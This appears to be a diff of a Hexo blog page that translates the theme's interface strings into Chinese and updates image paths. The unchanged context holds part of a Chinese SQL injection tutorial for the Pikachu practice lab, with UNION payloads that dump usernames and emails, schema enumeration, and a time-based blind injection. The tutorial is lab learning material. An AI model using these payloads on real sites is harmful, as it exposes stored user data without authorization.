@@ -64,7 +64,7 @@
                             <a class=""
                                href="/"
                             >
-                                HOME
+                                首页
                             </a>
                         </li>
                     
@@ -72,7 +72,7 @@
                             <a class=""
                                href="/archives"
                             >
-                                ARCHIVES
+                                归档
                             </a>
                         </li>
                     
@@ -80,7 +80,7 @@
                             <a class=""
                                href="/categories"
                             >
-                                CATEGORIES
+                                分类
                             </a>
                         </li>
                     
@@ -88,7 +88,7 @@
                             <a class=""
                                href="/tags"
                             >
-                                TAGS
+                                标签
                             </a>
                         </li>
                     
@@ -115,22 +115,22 @@
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">HOME</a>
+                       href="/">首页</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">ARCHIVES</a>
+                       href="/archives">归档</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">CATEGORIES</a>
+                       href="/categories">分类</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">TAGS</a>
+                       href="/tags">标签</a>
                 </li>
             
         </ul>
@@ -200,12 +200,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k Words</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>6 Mins</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>6 分钟</span>
         </span>
     
     
@@ -233,15 +233,15 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/img/image-20210312215138909.png"
-                      alt="image-20210312215138909"
+                     data-src="img/image-20210312220422344.png"
+                      alt="image-20210312220422344"
                 ></p>
 <p>id=5-2</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215155224.png"
-                      alt="image-20210312215155224"
+                     data-src="img/image-20210312220440405.png"
+                      alt="image-20210312220440405"
                 ></p>
 <p>可见id值为“3”与id值为“5-2”所得反馈相同</p>
 <p>即该注入点为数字型注入</p>
@@ -261,8 +261,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215208687.png"
-                      alt="image-20210312215208687"
+                     data-src="img/image-20210312220456908.png"
+                      alt="image-20210312220456908"
                 ></p>
 <p>既执行了id=1的查询，也执行了union后的查询</p>
 <p>指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询</p>
@@ -274,8 +274,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215222481.png"
-                      alt="image-20210312215222481"
+                     data-src="img/image-20210312220518876.png"
+                      alt="image-20210312220518876"
                 ></p>
 <p>之后可通过修改查询语句进行对数据库的查询</p>
 <p>查询表名</p>
@@ -285,8 +285,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215236382.png"
-                      alt="image-20210312215236382"
+                     data-src="img/image-20210312220530499.png"
+                      alt="image-20210312220530499"
                 ></p>
 <p>在原有数据后面加上”limit 1,1“参数即可显示第二条记录</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
@@ -295,8 +295,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215248216.png"
-                      alt="image-20210312215248216"
+                     data-src="img/image-20210312220541618.png"
+                      alt="image-20210312220541618"
                 ></p>
 <p>同理”limit 2,1“为限定查询结果第二条记录的后一条记录</p>
 <p>同理”limit 0,100“为限定查询结果的前一百条记录</p>
@@ -305,8 +305,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215301779.png"
-                      alt="image-20210312215301779"
+                     data-src="img/image-20210312220553461.png"
+                      alt="image-20210312220553461"
                 ></p>
 <p>亦可使用”group_concat“来用”,“联合多行记录</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名</span><br><span class="line">或</span><br><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名</span><br></pre></td></tr></table></figure>
@@ -314,8 +314,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215319586.png"
-                      alt="image-20210312215319586"
+                     data-src="img/image-20210312220613379.png"
+                      alt="image-20210312220613379"
                 ></p>
 <p>继续查询所需要的</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;member&#x27;</span></span><br><span class="line">id=-<span class="number">1</span> union select username,email <span class="keyword">from</span> member</span><br></pre></td></tr></table></figure>
@@ -324,8 +324,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215334880.png"
-                      alt="image-20210312215334880"
+                     data-src="img/image-20210312220625381.png"
+                      alt="image-20210312220625381"
                 ></p>
 <h2 id="UNION注入-字符型注入"><a href="#UNION注入-字符型注入" class="headerlink" title="UNION注入-字符型注入"></a>UNION注入-字符型注入</h2><p>GET参数输入的地方包裹单引号，变成字符串</p>
 <p>注入方式：尝试闭合前面单引号，且注释后面的语句</p>
@@ -340,8 +340,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215351620.png"
-                      alt="image-20210312215351620"
+                     data-src="img/image-20210312220641218.png"
+                      alt="image-20210312220641218"
                 ></p>
 <p>修改union后面的查询语句即可继续查询所需的内容</p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用页面报错信息获取数据</p>
@@ -375,8 +375,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215406724.png"
-                      alt="image-20210312215406724"
+                     data-src="img/image-20210312220700217.png"
+                      alt="image-20210312220700217"
                 ></p>
 <p>将database()函数替换为其他查询语句即可</p>
 <h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>通过注入得到的真假回显推测出数据</p>
@@ -421,8 +421,8 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="../img/image-20210312215421448.png"
-                      alt="image-20210312215421448"
+                     data-src="img/image-20210312220715891.png"
+                      alt="image-20210312220715891"
                 ></p>
 <p>判断数据库名</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and if((substr(database(), 1, 1))=&#x27;</span>p<span class="string">&#x27;, sleep(3), null)#</span></span><br></pre></td></tr></table></figure>
@@ -446,7 +446,7 @@
                         >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">Hello World</span>
-                                <span class="post-nav-item">Next posts</span>
+                                <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
@@ -482,18 +482,18 @@
             <div class="website-count info-item">
                 
                     <span id="busuanzi_container_site_uv">
-                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv">
-                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
         </div>
         
     </div>
@@ -590,7 +590,7 @@
                 <input autocomplete="off"
                        autocorrect="off"
                        autocapitalize="off"
-                       placeholder="Search..."
+                       placeholder="搜索..."
                        spellcheck="false"
                        type="search"
                        class="search-input"
